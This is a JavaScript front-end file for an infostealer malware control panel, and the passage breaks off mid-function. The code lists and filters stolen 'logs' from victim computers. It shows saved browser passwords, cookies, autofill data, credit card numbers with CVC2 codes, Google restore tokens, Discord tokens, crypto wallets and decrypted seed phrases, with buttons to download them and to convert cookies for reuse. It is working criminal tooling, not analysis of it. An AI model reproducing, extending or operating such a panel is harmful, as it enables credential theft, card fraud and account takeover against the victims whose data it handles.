/**
 * utf8_to_b64
 *
 * Convert text to base64 uri
 *
 * @return none
 */
function utf8_to_b64(str) 
{
	return window.btoa(unescape(encodeURIComponent(str)));
}

/**
 * formatCountry
 *
 * View country flag in select2
 *
 * @return none
 */
function formatCountry(state) 
{
	if (!state.id) return state.text;
	
	var baseUrl = "assets/images/flags";
	
	var $state = $(
		'<span><img src="' + baseUrl + '/' + state.element.value.toLowerCase() + '.png" class="img-flag" style="width: 16px;" /> ' + state.text + '</span>'
	);
	
	return $state;
};

var table;

$(document).ready(function() 
{
    $('#parse_countries').select2();

    LoadData();

    $('#select_all').on('click', function() 
    {
        var isChecked = $(this).is(':checked');
        $('input.checkbox-select-log').prop('checked', isChecked);
    });

    table = $('#logs_table').DataTable(
    {
        autoWidth: false,
        columnDefs: 
        [
            { targets: 0, width: "50px" },
            { targets: 2, width: "90px" },
            { targets: 3, width: "120px" },
            { targets: 4, width: "130px" },
            { targets: 5, width: "50px" },
        ],

        dom: '<"top"lpf>rt<"bottom"lpf>i',
        paging: true,
        pagingType: "full_numbers",
        processing: true,
        serverSide: true,
        ordering: false,
        searching: false,
        pageLength: 25,
        lengthMenu: [ [10, 25, 50, 100, 200], [10, 25, 50, 100, 200] ],

        ajax: 
        {
            url: 'api/logs', 
            type: 'POST',
            data: function (d) 
            {
                d.method                    = "search";
                delete d.columns;
                delete d.search;
                
                d.parse_builds              = utf8_to_b64($('#parse_builds').val());
                d.parse_passwords           = utf8_to_b64(document.getElementById("parse_passwords").value);
                d.parse_cookies             = utf8_to_b64(document.getElementById("parse_cookies").value);
                
                d.parse_ip                  = utf8_to_b64(document.getElementById("parse_ip").value);
                d.parse_marker              = utf8_to_b64($('#parse_marker').val());
                d.parse_system              = utf8_to_b64(document.getElementById("parse_system").value);
                
                d.parse_countries           = utf8_to_b64($('#parse_countries').val());
                d.parse_wallets             = utf8_to_b64(document.getElementById("parse_wallets").value);

                d.parse_date                = utf8_to_b64(document.getElementById("parse_date").value);
                d.parse_note                = utf8_to_b64(document.getElementById("parse_note").value);

                d.parse_steam               = $('#parse_steam').is(':checked') ? '1' : '0';
                d.parse_tox                 = $('#parse_tox').is(':checked') ? '1' : '0';
                d.parse_outlook             = $('#parse_outlook').is(':checked') ? '1' : '0';
                d.parse_discord             = $('#parse_discord').is(':checked') ? '1' : '0';
                d.parse_telegram            = $('#parse_telegram').is(':checked') ? '1' : '0';
                d.parse_pidgin              = $('#parse_pidgin').is(':checked') ? '1' : '0';

                d.parse_no_empty            = $('#parse_no_empty').is(':checked') ? '1' : '0';
                d.parse_repeated            = $('#parse_repeated').is(':checked') ? '1' : '0';
                d.parse_with_wallets        = $('#parse_with_wallets').is(':checked') ? '1' : '0';
                d.parse_with_mnemonic       = $('#parse_with_mnemonic').is(':checked') ? '1' : '0';
                d.parse_favorites           = $('#parse_favorites').is(':checked') ? '1' : '0';
                
                d.parse_no_download         = $('#parse_no_download').is(':checked') ? '1' : '0';
                d.parse_download            = $('#parse_download').is(':checked') ? '1' : '0';
            }
        },

        // Описываем колонки, которые будут отображаться
        columns: [
            { 
                data: null,
                "render": function (data, type, row) 
                {
                    return `
                        <div class="form-check form-check-inline">
                            <input class="form-check-input checkbox-select-log" type="checkbox" id="select_${data.log_id}" value="${data.log_id}">
                            <label class="form-check-label" for="select_${data.log_id}">${data.log_id}</label>
                            ${data.repeated === "1" ? '<svg title="Repeated Log" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24"><path fill="#F8C20A" d="M12 22C6.477 22 2 17.523 2 12S6.477 2 12 2s10 4.477 10 10s-4.477 10-10 10m-1-7v2h2v-2zm0-8v6h2V7z"/></svg>' : ''}
                        </div>
                    `;
                } 
            },
            { 
                data: null,
                "render": function (data, type, row) 
                {
                    const logInfo = JSON.parse(data.log_info);
                    var response = "";

                    if (logInfo && logInfo.hasOwnProperty('browsers')) 
                    {
                        for (const [browser, count] of Object.entries(logInfo.browsers))
                        {
                            response += `<a onclick="viewPasswords(${data.log_id});" class="mr-5" style="margin-right: 0.3rem; cursor: pointer;" data-toggle="tooltip" placeholder="Passwords"><img src="assets/images/summary/browsers/${browser}.png" height="18" title="${browser}"> ${count}</a>`;
                        }
                    }

                    if(data.count_cc > 0)
                    {
                        response += `<a onclick="viewLogInfo('${data.log_id}')" class="mr-5" style="margin-right: 0.3rem; cursor: pointer;" data-toggle="tooltip" placeholder="Passwords"><img src="assets/images/summary/cc.png" height="18" title="Credit Cards" > ${data.count_cc}</a>`;
                    }

                    if (logInfo && logInfo.hasOwnProperty('files')) 
                    {
                        response += `<a onclick="" class="mr-5" data-toggle="tooltip" placeholder="Files" style="color: black; cursor: pointer;"><img src="assets/images/summary/files.png" height="16" title="Files" /> ${logInfo.files}</a>`;
                    }

                    response += `<br>`;

                    if (logInfo && logInfo.hasOwnProperty('account_tokens')) 
                    {
                        response += `<a onclick="viewLogInfo('${data.log_id}')" class="mr-5" style="margin-right: 0.3rem; cursor: pointer;" data-toggle="tooltip" placeholder="Passwords"><img src="assets/images/summary/GoogleRestore.png" height="18" title="Google Restore Tokens" > </a>`;
                    }

                    response += `<br>`;

                    if (logInfo && logInfo.hasOwnProperty('plugins')) 
                    {
                        for (const [plugin, count] of Object.entries(logInfo.plugins))
                        {
                            response += `<a onclick="viewMnemonicList('${data.log_id}');" class="mr-5" data-toggle="tooltip" style="cursor: pointer;"><img src="assets/images/summary/plugins/${plugin}.jpg" height="18" title="${plugin}"> </a>`;
                        }
                    }

                    if (logInfo && logInfo.hasOwnProperty('wallets')) 
                    {
                        for (const [wallet, count] of Object.entries(logInfo.wallets))
                        {
                            response += `<a onclick="" class="mr-5" data-toggle="tooltip" style="cursor: pointer;"><img src="assets/images/summary/wallets/${wallet}.png" height="18" title="${wallet}"> </a>`;
                        }
                    }

                    if (logInfo && logInfo.hasOwnProperty('mnemonic')) 
                    {
                        response += `<br>`;
                        response += `<a onclick="viewMnemonicList('${data.log_id}');" class="mr-5" data-toggle="tooltip" style="cursor: pointer;"><img src="assets/images/summary/seed.png" height="18" title="Decrypted Mnemonic: ${logInfo.mnemonic}"> </a>`;
                    }

                    if (logInfo && logInfo.hasOwnProperty('soft')) 
                    {
                        response += `<br>`;
                        for (const [soft, count] of Object.entries(logInfo.soft))
                        {
                            response += `<a onclick="" class="mr-5" data-toggle="tooltip" style="cursor: pointer;"><img src="assets/images/summary/soft/${soft}.png" height="18" title="${soft}"> </a>`;
                        }
                    }

                    if (logInfo && logInfo.hasOwnProperty('marker')) 
                    {
                        response += `<br>`;
                        for (const [group, markers] of Object.entries(logInfo.marker))
                        {
                            for (const [key, val] of Object.entries(markers))
                            {
                                response += `<p style="color: ${val.color}; margin-bottom: 0;" >${key}</p>`;
                            }
                        }
                    }

                    return response;
                }
            },
            {
                data: null,
                "render": function (data, type, row) 
                {
                    return `<h6 class="fw-semibold mb-0">${data.ip}</h6>
                            <img src="assets/images/flags/${data.country.toLowerCase()}.png" height="14" placeholder="">`;
                }
            },
            { 
                data: null,
                "render": function (data, type, row) 
                {
                    const updated_date = formatTimeAgo(new Date(data.date));
                    return `<h6 class="fw-semibold mb-0">${data.date}</h6> <i>${updated_date}</i>`;
                }
            },
            {
                data: null,
                "render": function (data, type, row) 
                {
                    return `<div class="form-check form-check-inline" style="margin-bottom: 6px;">
                            <input class="form-check-input" type="checkbox" onchange="ChangeFavoriteState(${data.log_id});" id="favorite_${data.log_id}" ${data.favorite === "1" ? 'checked' : ''}>
                            <label class="form-check-label" for="favorite_${data.log_id}">Favorite</label>
                        </div>
                        <textarea class="form-control" rows="3" placeholder="Text Here..." onkeydown="if(event.key==='Enter' && !event.shiftKey){ event.preventDefault(); SaveComment(${data.log_id}, this.value); }">${ data.comment !== null ? data.comment : '' }</textarea>`;
                }
            },
            {
                data: null, className: 'long-text',
                "render": function (data, type, row) 
                {
                    var resp_value = "";

                    switch(data.status)
                    {
                        case "0":
                            resp_value = `<span class="badge bg-danger-subtle text-danger">Requested</span>`;
                            break;

                        case "1":
                            resp_value = `<span class="badge bg-warning-subtle text-warning">Uploading</span>`;
                            break;

                        case "2":
                            resp_value = `<span class="badge bg-primary-subtle text-primary">Upload</span>`;
                            break;

                        case "3":
                            resp_value = `<span class="badge bg-success-subtle text-success">Mnemonic</span>`;
                            break;
                    }

                    return resp_value;
                }
            },
            {
                data: null,
                "render": function (data, type, row) 
                {
                    return `
                    <div class="btn-group" style="margin-bottom: 6px;">
                        <button type="button" class="btn btn-primary" onclick="window.open('api/logs?method=download&filename=${data.filename}', '_blank')">
                            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24">
                                <path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 18a3.5 3.5 0 0 0 0-7h-1A5 4.5 0 0 0 7 9a4.6 4.4 0 0 0-2.1 8.4M12 13v9m-3-3l3 3l3-3"/>
                            </svg> Download
                        </button>
                        <button type="button" class="btn bg-primary-subtle dropdown-toggle dropdown-toggle-split" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                            <span class="sr-only">Actions</span>
                        </button>
                        <ul class="dropdown-menu">
                            <li>
                                <a class="dropdown-item" style="cursor: pointer;" onclick="viewLogInfo('${data.log_id}')">More Information</a>
                            </li>
                            ${data.screenshot == 1 ? `
                            <li>
                                <a class="dropdown-item" style="cursor: pointer;" onclick="viewScreenshot('${data.log_id}', '${data.filename}')" >View Screenshot</a>
                            </li>` : ''}
                            <li>
                                <hr class="dropdown-divider">
                            </li>
                            <li>
                                <a class="dropdown-item" style="cursor: pointer;" onclick="blockLog('${data.hwid}', '${data.ip}');" >Block</a>
                            </li>
                            <li>
                                <hr class="dropdown-divider">
                            </li>
                            <li>
                                <a class="dropdown-item" style="cursor: pointer;" onclick="deleteLog(${data.log_id});" >Delete</a>
                            </li>
                        </ul>
                    </div>
                    <br>
                    <span class="${ data.download > 0 ? "text-primary": "" }">
                        <span>
                            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24">
                                <path fill="currentColor" fill-rule="evenodd" d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2s7.071 0 8.535 1.464C22 4.93 22 7.286 22 12s0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12m10-5.75a.75.75 0 0 1 .75.75v5.19l1.72-1.72a.75.75 0 1 1 1.06 1.06l-3 3a.75.75 0 0 1-1.06 0l-3-3a.75.75 0 1 1 1.06-1.06l1.72 1.72V7a.75.75 0 0 1 .75-.75m-4 10a.75.75 0 0 0 0 1.5h8a.75.75 0 0 0 0-1.5z" clip-rule="evenodd"/>
                            </svg>
                        </span> ${data.download}&nbsp;&nbsp;
                    </span>
                    <span class="">
                        <span>
                            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24">
                                <path fill="currentColor" fill-rule="evenodd" d="M2.07 5.258C2 5.626 2 6.068 2 6.95V14c0 3.771 0 5.657 1.172 6.828S6.229 22 10 22h4c3.771 0 5.657 0 6.828-1.172S22 17.771 22 14v-2.202c0-2.632 0-3.949-.77-4.804a3 3 0 0 0-.224-.225C20.151 6 18.834 6 16.202 6h-.374c-1.153 0-1.73 0-2.268-.153a4 4 0 0 1-.848-.352C12.224 5.224 11.816 4.815 11 4l-.55-.55c-.274-.274-.41-.41-.554-.53a4 4 0 0 0-2.18-.903C7.53 2 7.336 2 6.95 2c-.883 0-1.324 0-1.692.07A4 4 0 0 0 2.07 5.257M16.283 3c.365 0 .548 0 .702.02c1.018.14 1.828.943 2.014 1.98a5 5 0 0 0-.461-.081c-.64-.084-1.448-.084-2.45-.084h-.334c-.942 0-1.3-.005-1.625-.101a2.5 2.5 0 0 1-.542-.233c-.296-.17-.552-.428-1.218-1.118L12 3zM13 9.25a.75.75 0 0 0 0 1.5h5a.75.75 0 0 0 0-1.5z" clip-rule="evenodd"/>
                            </svg>
                        </span> ~${data.filesize}&nbsp;&nbsp;
                    </span>
                    <span>
                        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24">
                            <path fill="currentColor" fill-rule="evenodd" d="M3.464 3.464C2 4.93 2 7.286 2 12s0 7.071 1.464 8.535C4.93 22 7.286 22 12 22s7.071 0 8.535-1.465C22 19.072 22 16.714 22 12s0-7.071-1.465-8.536C19.072 2 16.714 2 12 2S4.929 2 3.464 3.464m2.96 6.056a.75.75 0 0 1 1.056-.096l.277.23c.605.504 1.12.933 1.476 1.328c.379.42.674.901.674 1.518s-.295 1.099-.674 1.518c-.356.395-.871.824-1.476 1.328l-.277.23a.75.75 0 1 1-.96-1.152l.234-.195c.659-.55 1.09-.91 1.366-1.216c.262-.29.287-.427.287-.513s-.025-.222-.287-.513c-.277-.306-.707-.667-1.366-1.216l-.234-.195a.75.75 0 0 1-.096-1.056M17.75 15a.75.75 0 0 1-.75.75h-5a.75.75 0 0 1 0-1.5h5a.75.75 0 0 1 .75.75"/>
                        </svg> ${data.build}
                    </span>
                `;}
            }
        ],
    });

    $('#search_button').on('click', function()
    {
        table.draw();
    });
});

/**
 * formatTimeAgo
 *
 * 
 *
 * @return parsed date
 */
function formatTimeAgo(startDate) 
{
    const currentDate = new Date(server_time);
    const timeDifference = currentDate - startDate;

    if (timeDifference < 0) 
    {
        return "Date is in the future";
    }

    const seconds = Math.floor(timeDifference / 1000);
    const minutes = Math.floor(seconds / 60);
    const hours = Math.floor(minutes / 60);
    const days = Math.floor(hours / 24);
    const months = Math.floor(days / 30);

    let result = [];

    if (months > 0) {
        result.push(`${months}m`);
    }

    const remainingDays = days % 30;
    if (remainingDays > 0) {
        result.push(`${remainingDays}d`);
    }

    const remainingHours = hours % 24;
    if (remainingHours > 0) {
        result.push(`${remainingHours}h`);
    }

    const remainingMinutes = minutes % 60;
    if (remainingMinutes > 0) {
        result.push(`${remainingMinutes}m`);
    }

    const remainingSeconds = seconds % 60;
    if (remainingSeconds > 0) {
        result.push(`${remainingSeconds}s`);
    }

    if (result.length === 0) {
        return "just now";
    }

    return result.join(" ") + " ago";
}

/**
 * viewPasswords
 *
 * 
 *
 * @return none
 */
function viewPasswords(log_id) 
{
    $.post('api/logs', 
        { 
            method: 'get_passwords',
            log_id: log_id
        },
        function(response) 
        {
            if(response.error) 
            {
                $('#modal_passwords .modal-body-passwords').html('<p>' + response.error + '</p>');
            } 
            else 
            {
                var tableHtml = generateTablePasswordsModal(response);
                $('#modal_passwords .modal-body-passwords').html(tableHtml);
            }

            document.getElementById("passwords_modal_header").innerHTML = "Passwords from #" + log_id;
            
            var modal_passwords = new bootstrap.Modal(document.getElementById('modal_passwords'), 
            {
                backdrop: 'static',
                keyboard: false
            });
            modal_passwords.show();
        },
        'json'
    );
}

/**
 * fetchStats
 *
 * 
 *
 * @return json
 */
function fetchStats() 
{
    return $.ajax({
        url: 'api/logs',
        type: 'POST',
        dataType: 'json',
        data: 
        {
            method: 'get_stats'
        }
    });
}

/**
 * LoadData
 *
 * 
 *
 * @return none
 */
function LoadData()
{
    fetchStats().done(function(stats)
    {
        //$('html').attr('data-bs-theme', stats.theme);
        //$('html').attr('data-color-theme', stats.colorset);

        $('#logs_count').html(stats.logs_count);
        $('#unique_logs_percent').html(stats.unique_logs_percent);
        $('#fully_logs_count').html(stats.fully_logs_count);
        $('#passwords_count').html(stats.passwords_count);

        $('#parse_date').val(stats.early_log_date);

        $('#parse_countries').select2({
            data: stats.countries,
            searchInputPlaceholder: 'Search options',
            placeholder: "countries...",		
        });

        $('#parse_builds').select2(
        {
            data: stats.builds,
            searchInputPlaceholder: 'Search options',
            placeholder: "builds...",			
        });

        $('#parse_marker').select2(
        {
            data: stats.markers,
            searchInputPlaceholder: 'Search options',
            placeholder: "markers...",			
        });

        if(stats.downloads_created)
        {
            $("#warning_created_downloads").show();
        }

    }).fail(function(jqXHR, textStatus, errorThrown) 
    {
        //showError('Error fetching configuration');
    });
}

/**
 * SearchInPasswordsModal
 *
 * Search in passwords modal for all parameters
 *
 * @return none
 */
function SearchInPasswordsModal() 
{
	var input, filter, table, tr, td, i, d;
	input = document.getElementById("PasswordsModalSearchInput");
	filter = input.value.toUpperCase();
	table = document.getElementById("PasswordsModalTable");
	tr = table.getElementsByTagName("tr");
	
	for (i = 0; i < tr.length; i++) 
	{
		td = tr[i];
		
		if (td) 
		{
			if (td.innerHTML.toUpperCase().indexOf(filter) > -1) 
			{
				tr[i].style.display = "";
			}
			else 
			{
				tr[i].style.display = "none";
			}
		}
	}
}

/**
 * viewScreenshot
 *
 * View log screen modal
 *
 * @return none
 */
function viewScreenshot(log_id, filename)
{
	$('.modal-body-screenshot').children().remove();
	$('.modal-body-screenshot').append(`<img src="api/logs?method=get_screenshot&filename=${filename}" width="100%">`);

    document.getElementById("screenshot_modal_header").innerHTML = "Screenshot from #" + log_id;

    var modal_screenshot = new bootstrap.Modal(document.getElementById('modal_screenshot'), {
        backdrop: 'static',
        keyboard: false
    });
    modal_screenshot.show();
};

/**
 * ChangeFavoriteState
 *
 * Change log favorite state
 *
 * @return none
 */
function ChangeFavoriteState(log_id)
{
    var favorite 	= document.getElementById("favorite_"+ log_id);
	var message 	= "";
	
	if (favorite.checked == true) 
	{
		favorite = "1";
		message = "success: add to favorites";
	}
	else 
	{
		favorite = "0";
		message = "success: removed from favorites";
	}
	
	
	$.post( "api/logs", { method: "change_favorite", log_id: log_id, favorite: favorite}).done(function(data)
	{
		toastr.info(message);
	});
}

/**
 * SaveComment
 *
 * Change comment for log
 *
 * @return none
 */
function SaveComment(log_id, comment)
{
    $.post( "api/logs", { method: "change_comment", log_id: log_id, comment: utf8_to_b64(comment)}).done(function(data)
	{
		toastr.info("commentary for log saved");
	});
}

/**
 * viewLogInfo
 *
 * View log info modal
 *
 * @return none
 */
function viewLogInfo(log_id)
{
    $.post('api/logs', 
        { 
            method: 'get_info',
            log_id: log_id
        },
        function(response) 
        {
            if(response.error) 
            {
                $('#modal_about .modal-body-about').html('<p>' + response.error + '</p>');
            } 
            else 
            {
                var tableHtml = generateTableLogInfo(response);
                $('#modal_about .modal-body-about').html(tableHtml);
            }

            document.getElementById("about_modal_header").innerHTML = "About Log #" + log_id;
            
            var modal_about = new bootstrap.Modal(document.getElementById('modal_about'), 
            {
                backdrop: 'static',
                keyboard: false
            });
            modal_about.show();
        },
        'json'
    );
}

/**
 * generateTableLogInfo
 *
 * 
 *
 * @return table
 */
function generateTableLogInfo(data) 
{
    if (Object.keys(data).length === 0) 
    {
        return '<p>Error no data</p>';
    }
    
    var html = '<table class="table table-bordered">';
    html += '<thead><tr><th><h6 class="fs-4 fw-semibold mb-0">Parameter</h6></th><th><h6 class="fs-4 fw-semibold mb-0">Value</h6></th></tr></thead>';
    html += '<tbody>';
    
    for (var key in data) 
    {
        if (data.hasOwnProperty(key)) 
        {
            switch(key)
            {
                case "IP":
                    html += 
                    `<tr>
                        <td><h6 class="fs-4 fw-semibold mb-0">Network</h6></td>
                        <td><p class="mb-0 fw-normal fs-4">${data["IP"]} [${data["Country"]} <img src="assets/images/flags/${data["Country"].toLowerCase()}.png" height="10" placeholder="" />]</p></td>
                    </tr>`;
                    break;

                case "Country":
                    break;

                case "filename":
                    html += 
                    `
                    <tr>
                        <td><h6 class="fs-4 fw-semibold mb-0">Passwords</h6></td>
                        <td>
                            <button type="button" class="btn btn-sm btn-primary mb-1" onclick="downloadFromLog('${data["filename"]}', 'passwords.txt');">
                                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M22 6.72c0 2.607-2.122 4.72-4.74 4.72c-.477 0-1.565-.11-2.094-.549l-.661.659c-.389.387-.284.501-.11.689c.071.078.155.17.22.299c0 0 .551.768 0 1.537c-.33.439-1.256 1.053-2.314 0l-.22.22s.66.768.11 1.536c-.331.439-1.213.878-1.985.11l-.771.768c-.53.527-1.176.22-1.433 0l-.661-.659c-.617-.614-.257-1.28 0-1.536l5.731-5.708s-.55-.878-.55-2.086c0-2.607 2.121-4.72 4.739-4.72S22 4.113 22 6.72m-3.086 0c0 .91-.74 1.647-1.653 1.647a1.65 1.65 0 0 1-1.654-1.647c0-.91.74-1.647 1.654-1.647a1.65 1.65 0 0 1 1.653 1.647" clip-rule="evenodd"/><path fill="currentColor" d="M13.196 2.001a6.2 6.2 0 0 0-2.175 4.72c0 .68.127 1.276.273 1.738l-5.012 4.992a2.7 2.7 0 0 0-.75 1.455c-.122.747.095 1.555.75 2.207l.662.659q.04.04.084.078a2.8 2.8 0 0 0 1.37.623a2.42 2.42 0 0 0 2.088-.693c.385.097.78.105 1.16.032a2.9 2.9 0 0 0 1.763-1.107q.199-.278.31-.557a3 3 0 0 0 .291-.04a3 3 0 0 0 1.824-1.16a2.74 2.74 0 0 0 .487-2.08a6.24 6.24 0 0 0 5.678-2.1L22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12s0-7.071 1.464-8.536C4.93 2 7.286 2 12 2z"/></svg> 
                                Saved Passwords</button>
                            </td>
                    </tr>
                    `;
                    break;

                case "log_info":
                    const log_info = data[key];

                    for (var log_key in log_info) 
                    {
                        if (log_info.hasOwnProperty(log_key)) 
                        {
                            switch(log_key)
                            {
                                case "pc_username":
                                    html += 
                                    `
                                    <tr>
                                        <td><h6 class="fs-4 fw-semibold mb-0">Username</h6></td>
                                        <td><p class="mb-0 fw-normal fs-4">${log_info[log_key]}</p></td>
                                    </tr>
                                    `;
                                    break;

                                case "pc_name":
                                    html += 
                                    `
                                    <tr>
                                        <td><h6 class="fs-4 fw-semibold mb-0">PC Name</h6></td>
                                        <td><p class="mb-0 fw-normal fs-4">${log_info[log_key]}</p></td>
                                    </tr>
                                    `;
                                    break;

                                case "cookies":
                                    html += `<tr><td><h6 class="fs-4 fw-semibold mb-0">Cookies</h6></td><td>`;
                                        
                                    for (var cookie_key in log_info[log_key]) 
                                    {
                                        html += 
                                        `
                                            <button type="button" class="btn btn-sm btn-primary mb-2" onclick="downloadFromLog('${data["filename"]}', 'cookies\\\\${cookie_key}');">${cookie_key} (~${log_info[log_key][cookie_key]['size']}kb)</button>
                                            <button type="button" class="btn btn-sm btn-light mb-2" onclick="ConvertCookie('${data["filename"]}', 'cookies\\\\${cookie_key}');">json</button>
								            <br>
                                        `;
                                    }

                                    html += `</td></tr>`;
                                    break;

                                case "autofill":
                                    html += `<tr><td><h6 class="fs-4 fw-semibold mb-0">AutoFill</h6></td><td>`;

                                    for (var autofill_key in log_info[log_key]) 
                                    {
                                        html += 
                                        `
                                            <button type="button" class="btn btn-sm btn-primary mb-2" onclick="downloadFromLog('${data["filename"]}', 'autofill\\\\${autofill_key}');">${autofill_key} (~${log_info[log_key][autofill_key]['size']}kb)</button>
								            <br>
                                        `;
                                    }

                                    html += `</td></tr>`;
                                    break;

                                case "account_tokens":
                                    html += `<tr><td><h6 class="fs-4 fw-semibold mb-0">Google Restore Tokens</h6></td><td>
                                        <table class="table text-nowrap mb-0 align-middle">
                                            <thead class="text-dark fs-4">
                                                <tr>
                                                    <th><h6 class="fs-4 fw-semibold mb-0">Browser</h6></th>
                                                    <th><h6 class="fs-4 fw-semibold mb-0">Token</h6></th>
                                                    <th></th>
                                                </tr>
                                            </thead>
                                            <tbody>
                                    `;

                                    for (var token_key in log_info[log_key]) 
                                    {
                                        html += 
                                        `
                                                <tr>
                                                    <td>
                                                        <div class="d-flex align-items-center">
                                                            <img src="assets/images/summary/browsers/${log_info[log_key][token_key]["browser"]}.png" class="rounded-2" width="42" height="42">
                                                            <div class="ms-3">
                                                                <h6 class="fw-semibold mb-1">${log_info[log_key][token_key]["browser"]}</h6>
                                                                <span class="fw-normal">${log_info[log_key][token_key]["name"]}</span>
                                                            </div>
                                                        </div>
                                                    </td>
                                                    <td>
                                                        <div class="form-group">
                                                            <input type="text" class="form-control" id="readonly" value="${log_info[log_key][token_key]["token"]}" readonly="" onclick="this.select()">
                                                        </div>
                                                    </td>
                                                    <td>
                                                        <a href="javascript:void(0)" class="text-muted" id="dropdownMenuButton" data-bs-toggle="dropdown" aria-expanded="false" onclick="downloadFromLog('${data["filename"]}', 'AccountTokens\\\\${token_key}');">
                                                            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2s7.071 0 8.535 1.464C22 4.93 22 7.286 22 12s0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12m10-5.75a.75.75 0 0 1 .75.75v5.19l1.72-1.72a.75.75 0 1 1 1.06 1.06l-3 3a.75.75 0 0 1-1.06 0l-3-3a.75.75 0 1 1 1.06-1.06l1.72 1.72V7a.75.75 0 0 1 .75-.75m-4 10a.75.75 0 0 0 0 1.5h8a.75.75 0 0 0 0-1.5z" clip-rule="evenodd"/></svg>
                                                        </a>
                                                    </td>
                                                </tr>
                                        `;
                                    }

                                    html += `</tbody>
                                        </table></td></tr>`;
                                    break;

                                case "cc":
                                    html += `<tr><td><h6 class="fs-4 fw-semibold mb-0">Credit Cards</h6></td><td>
                                        <table class="table text-nowrap mb-0 align-middle">
                                            <thead class="text-dark fs-4">
                                                <tr>
                                                    <th><h6 class="fs-4 fw-semibold mb-0">Browser</h6></th>
                                                    <th><h6 class="fs-4 fw-semibold mb-0">Card</h6></th>
                                                    <th><h6 class="fs-4 fw-semibold mb-0">Date</h6></th>
                                                    <th><h6 class="fs-4 fw-semibold mb-0">CVC2</h6></th>
                                                    <th></th>
                                                </tr>
                                            </thead>
                                            <tbody>`;

                                    for (var card_key in log_info[log_key])
                                    {
                                        html += `
                                            <tr>
                                                <td>
                                                    <div class="d-flex align-items-center">
                                                        <img src="assets/images/summary/browsers/${log_info[log_key][card_key]["browser"]}.png" class="rounded-2" width="42" height="42">
                                                        <div class="ms-3">
                                                            <h6 class="fw-semibold mb-1">${log_info[log_key][card_key]["browser"]}</h6>
                                                            <span class="fw-normal">${log_info[log_key][card_key]["profile"]}</span>
                                                        </div>
                                                    </div>
                                                </td>
                                                <td>
                                                    <div class="form-group">
                                                        <input type="text" class="form-control" id="readonly" value="${log_info[log_key][card_key]["card"]}" readonly="" onclick="this.select()">
                                                    </div>
                                                </td>
                                                <td>
                                                    <h6 class="fs-4 fw-semibold mb-0">${log_info[log_key][card_key]["expiration_month"]}/${log_info[log_key][card_key]["expiration_year"]}</h6>
                                                </td>
                                                <td>
                                                    <h6 class="fs-4 fw-semibold mb-0">${log_info[log_key][card_key]["cvc2"]}</h6>
                                                </td>
                                                <td>
                                                    <a href="javascript:void(0)" class="text-muted" id="dropdownMenuButton" data-bs-toggle="dropdown" aria-expanded="false" onclick="downloadFromLog('${data["filename"]}', 'cc\\\\${card_key}');">
                                                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2s7.071 0 8.535 1.464C22 4.93 22 7.286 22 12s0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12m10-5.75a.75.75 0 0 1 .75.75v5.19l1.72-1.72a.75.75 0 1 1 1.06 1.06l-3 3a.75.75 0 0 1-1.06 0l-3-3a.75.75 0 1 1 1.06-1.06l1.72 1.72V7a.75.75 0 0 1 .75-.75m-4 10a.75.75 0 0 0 0 1.5h8a.75.75 0 0 0 0-1.5z" clip-rule="evenodd"/></svg>
                                                    </a>
                                                </td>
                                            </tr>            
                                        `;
                                    }

                                    html += `</tbody>
                                        </table></td></tr>`;

                                    break;

                                case "soft":
                                    html += `<tr><td><h6 class="fs-4 fw-semibold mb-0">Soft</h6></td><td>`;

                                    for (const key in log_info[log_key]) 
                                    {
                                        if (log_info[log_key].hasOwnProperty(key)) 
                                        {
                                            const value = log_info[log_key][key];
                                            
                                            if (typeof value === 'number') 
                                            {
                                                html += `<img src="assets/images/summary/soft/${key}.png" height="28" title="${key}">`;
                                            }
                                        }
                                    }

                                    html += `</td></tr>`;
                                    break;

                                default:
                                    break;
                            }
                        }
                    }

                    if (log_info["soft"] && log_info["soft"].hasOwnProperty("Discord"))
                    {
                        if (log_info["soft"]["Discord"].hasOwnProperty("count"))
                        {
                            html += `<tr><td><h6 class="fs-4 fw-semibold mb-0">Discord Tokens</h6></td><td>`;
        
                            for (const token in log_info["soft"]["Discord"]["tokens"])
                            {
                                html += `
                                    <div class="form-group">
                                        <input type="text" class="form-control" id="readonly" value="${log_info["soft"]["Discord"]["tokens"][token]}" readonly="" onclick="this.select()">
                                    </div>`;
                            }
                                
                            html += `</td></tr>`;
                        }
                    }
                    break;

                default:
                    html += `<tr><td><h6 class="fs-4 fw-semibold mb-0">${key}</h6></td><td><p class="mb-0 fw-normal fs-4">${data[key]}</p></td></tr>`;
                    break;
            }
        }
    }
    
    html += '</tbody></table>';
    return html;
}

/**
 * generateTablePasswordsModal
 *
 * 
 *
 * @return table
 */
function generateTablePasswordsModal(data)
{
    if (Object.keys(data).length === 0) 
    {
        return '<p>Error no data</p>';
    }

    var html = `
    <div class="row" style="">
		
        <div class="col-md-8" style="margin-top: 10px; margin-bottom: 10px;">
        </div>
        
        <div class="col-md-4" style="margin-left: -20px; margin-top: 10px; margin-bottom: 10px;">
            <input type="text" class="form-control form-control-m" placeholder="Search..." onkeyup="SearchInPasswordsModal()" id="PasswordsModalSearchInput">
        </div>
